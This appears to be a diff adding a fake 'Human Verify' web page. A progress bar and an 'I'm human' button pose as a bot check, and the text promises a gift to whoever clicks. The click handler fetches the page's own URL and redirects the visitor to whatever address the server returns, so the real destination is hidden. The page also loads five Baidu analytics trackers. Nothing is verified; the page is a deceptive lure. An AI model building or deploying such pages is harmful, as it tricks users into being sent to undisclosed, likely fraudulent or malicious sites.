@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+ <head>
+  <title>
+   Human Verify
+  </title>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <style>
+   body {
+      margin-top: 100px;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      background-color: #FCF5EB;
+    }
+        .title-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            border-bottom: 2px solid #116116;
+            display: flex;
+            align-items: flex-end;
+            justify-content: center;
+            background-color: rgba(252, 245, 235, 0.9);
+        }
+
+        .title-bar h1 {
+            margin-top: 10px;
+            font-size: 24px;
+            color: #4CAF50;
+        }
+
+    #text-container {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333333;
+      padding-left: 3%;
+      padding-right: 3%;
+    }
+
+    #text-container h1 {
+      font-size: 30px;
+    }
+
+    #text-container p {
+      font-size: 20px;
+    }
+
+    #progress-container {
+      width: 80%;
+      padding: 20px;
+      background-color: rgba(255, 255, 255, 0.3);
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    #progress-bar {
+      position: relative;
+      width: 100%;
+      height: 20px;
+      background-color: lightgray;
+      margin-bottom: 10px;
+      border-radius: 10px;
+    }
+
+    #progress {
+      width: 0%;
+      height: 100%;
+      background-color: #92c9f6;
+      transition: width 0.1s;
+      border-radius: 10px;
+    }
+
+    #percentage-container {
+      position: absolute;
+      top: 0;
+      left: 0;
+      display: flex;
+      align-items: center;
+      height: 100%;
+    }
+
+    #percentage {
+      color: white;
+      font-size: 12px;
+      padding: 0 5px;
+    }
+
+    #button {
+      width: 100%;
+      height: 50px;
+      background-color: #cccccc;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: not-allowed;
+    }
+    @keyframes pulsate {
+      0% {
+        transform: scale(0.98);
+      }
+      50% {
+        transform: scale(1.02);
+      }
+      100% {
+        transform: scale(0.98);
+      }
+    }
+    
+    .pulse {
+      animation: pulsate 1.2s infinite;
+    }
+  </style>
+ </head>
+ <body>
+  <div class="title-bar">
+   <h1>
+    Human Verify
+   </h1>
+  </div>
+  <img src="https://cdn-icons-png.flaticon.com/128/2808/2808284.png"/>
+  <div id="text-container">
+   <h1>
+    Are you human?
+   </h1>
+   <p>
+    We are verifying that you are human and not a robot.
+   </p>
+  </div>
+  <div id="progress-container">
+   <div id="progress-bar">
+    <div id="progress">
+    </div>
+    <div id="percentage-container">
+     <div id="percentage">
+      0%
+     </div>
+    </div>
+   </div>
+   <button disabled="" id="button">
+    Verify
+   </button>
+  </div>
+  <div id="text-container">
+   <p>
+    Click on "I'm Human" and claim your gift
+   </p>
+  </div>
+  <script>
+   function startProgressBar() {
+      const progressBar = document.getElementById("progress");
+      const percentageContainer = document.getElementById("percentage-container");
+      const button = document.getElementById("button");
+
+      let progress = 0;
+      const increment = 100 / (1 * 1000 / 10); // 
+
+      const intervalId = setInterval(() => {
+        progress += increment;
+        progressBar.style.width = progress + "%";
+        percentageContainer.style.left = progress + "%";
+        percentageContainer.style.transform = `translateX(-${progress}%)`;
+        document.getElementById("percentage").innerText = Math.floor(progress) + "%";
+
+        if (progress >= 100) {
+          clearInterval(intervalId);
+          button.removeAttribute("disabled");
+          button.innerText = "I'm human";
+          button.classList.add('pulse');
+          document.getElementById("button").style.backgroundColor = "#348837";
+          button.addEventListener("click", function() {
+            fetch(window.location.href)
+                .then(response => response.text())
+                .then(redirectUrl => {
+                    window.location.href = redirectUrl;
+                });
+        });
+        }
+      }, 10);
+    }
+
+    startProgressBar();
+  </script>
+  <script type="text/javascript">
+   var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?b69313b789c1ede174449e2e0aa415c1";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script type="text/javascript">
+   var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?efae72b15bb04ecc7ba1b46a7a77a73e";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script type="text/javascript">
+   var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?70f5f07b8105f501ec0a2de78be68631";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script type="text/javascript">
+   var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?cdddf19b6748e203f8ccf476baa8c3fe";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+   var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?6c261ac02910458599cfcc630668c4c8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+  </script>
+ </body>
+</html>
